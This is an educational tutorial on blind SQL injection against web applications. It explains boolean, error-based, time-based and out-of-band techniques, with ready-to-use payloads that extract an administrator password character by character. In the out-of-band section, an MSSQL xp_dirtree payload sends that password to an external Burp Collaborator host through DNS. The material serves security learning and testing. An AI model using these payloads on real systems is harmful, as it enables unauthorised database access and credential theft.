# Blind SQL Injection
Blind SQL injection occurs when an application is vulnerable to SQL injection, but the results of the injected query are not directly visible in the HTTP response.
The application may also hide database error messages.
Because of this, techniques such as `UNION` attacks are usually not useful, since they depend on displaying the results of the injected query.
Blind SQL injection can still be exploited, but the attacker has to infer information indirectly by observing changes in the application's behavior, response content, response time, or external interactions.

## Conditional responses
Blind SQL injection can sometimes be exploited by making the application respond differently depending on whether an injected condition is true or false.
For example, an application may use a tracking cookie inside a SQL query:

```sql
SELECT TrackingId FROM TrackedUsers
WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

If a valid tracking ID is found, the application may display a message such as:

```text
Welcome back
```

This difference can be used as a true/false signal.

For example:

```text
xyz' AND '1'='1
```

The condition is true, so the application behaves as if the tracking ID matched.

But:

```text
xyz' AND '1'='2
```

is false, so the response changes.
This makes it possible to ask the database yes/no questions and infer information one piece at a time.

### Extracting data character by character
A condition can also test individual characters from a value.
For example:

```text
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'),1,1) = 's
```

This means:
- Retrieve the administrator password.
- Take its first character.
- Test whether this character is `s`.

If the application's "true" response appears, the first character is `s`.

Characters can also be compared using conditions such as:

```text
> 'm'
```

This allows the possible character range to be reduced progressively instead of testing every character one by one.
The same process can then be repeated for the second, third, and following characters until the full value is recovered.
The exact substring function depends on the database system. Some databases use `SUBSTRING`, while others use `SUBSTR`.

## Error-based SQL injection

Error-based SQL injection uses database errors as an observable signal to extract or infer information.

There are two main approaches:

- Triggering an error only when a specific condition is true. The presence or absence of the error can then be used as a boolean signal.
- Causing the database error itself to include sensitive data returned by an injected query.

The first approach is similar to conditional-response blind SQL injection, except that the signal is an error instead of a change in page content.

The second approach can sometimes turn an otherwise blind SQL injection vulnerability into one where extracted data becomes directly visible in the application's error response.

### Conditional errors

When normal application responses do not change depending on whether a SQL condition is true or false, database errors can be used as an alternative signal.

A `CASE` expression can execute different expressions depending on a condition.

For example:

```text
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

Because `1=2` is false, the expression returns `'a'` and no error occurs.

But:

```text
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

causes a divide-by-zero error because the condition is true.

This creates a boolean signal:

```text
True condition  -> database error
False condition -> normal response
```

The same technique can be used to infer sensitive data one character at a time:

```text
xyz' AND (SELECT CASE WHEN (Username='Administrator' AND SUBSTRING(Password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users)='a
```

If the request causes an error, the tested condition is true. Otherwise, it is false.

The exact technique used to trigger an error depends on the database system.

### Verbose SQL error messages

Some applications expose detailed database error messages.

These errors can reveal useful information such as:

- The structure of the SQL query.
- The context in which user input is inserted.
- Database-specific syntax details.

For example, an unterminated string error may reveal that the input is inserted inside a quoted value in a `WHERE` clause.

In some cases, an attacker can deliberately trigger a type conversion error that includes sensitive data in the error message.

For example:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

If the selected value contains text that cannot be converted to an integer, the database may return an error such as:

```text
invalid input syntax for type integer: "Example data"
```

This can make otherwise blind SQL injection effectively visible, because the queried value is leaked directly through the database error message.

The exact behavior depends on the database system and how errors are handled by the application.

### Time-based blind SQL injection

When an application hides database errors and does not change its response based on query results, response time can be used as an indirect signal.

The attacker can trigger a database delay only when a specific condition is true.

For example, on Microsoft SQL Server:

```text
'; IF (1=2) WAITFOR DELAY '0:0:10'--
```

does not cause a delay because the condition is false.

But:

```text
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

causes the database to wait before returning the result.

This creates another boolean channel:

```text
True condition  -> delayed response
False condition -> normal response time
```

The same technique can be used to infer sensitive data character by character:

```text
'; IF (SELECT COUNT(Username) FROM Users
WHERE Username='Administrator'
AND SUBSTRING(Password,1,1)>'m')=1
WAITFOR DELAY '0:0:10'--
```

If the response is delayed, the tested condition is true.

The exact syntax used to trigger time delays depends on the database system.

### Out-of-band (OAST) SQL injection

Some blind SQL injection vulnerabilities provide no observable difference in the HTTP response.

This can happen when the vulnerable SQL query is executed asynchronously. In this situation:

- Query results are not visible.
- Database errors do not affect the response.
- Time delays do not delay the original HTTP response.

An alternative is to trigger an external network interaction from the database to a system controlled by the tester. This technique is known as out-of-band application security testing (OAST).

DNS is particularly useful because outbound DNS traffic is commonly allowed by production networks.

For example, on Microsoft SQL Server:

```text
'; exec master..xp_dirtree '//example.burpcollaborator.net/a'--
```

can cause the database server to perform a DNS lookup for:

```text
example.burpcollaborator.net
```

If the external server receives this lookup, it confirms that the injected SQL was executed.

Out-of-band techniques can also sometimes include sensitive data directly inside the generated network request, allowing information to be exfiltrated without extracting it through HTTP responses one character at a time.

The exact technique used to generate external interactions depends on the database system.

#### Exfiltrating data through OAST

After confirming that the database can trigger external network interactions, the same channel can sometimes be used to exfiltrate data directly.

For example, on Microsoft SQL Server:

```text
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.example.burpcollaborator.net/a"')--
```

The injected query retrieves the administrator password and inserts it into a domain name.

If the password is:

```text
S3cure
```

the database may perform a DNS lookup for:

```text
S3cure.example.burpcollaborator.net
```

The external OAST server can then observe the DNS request and recover the leaked value directly.

This can be much more efficient than extracting data one character at a time through response differences, errors, or timing delays.

The exact exfiltration technique depends on the database system.
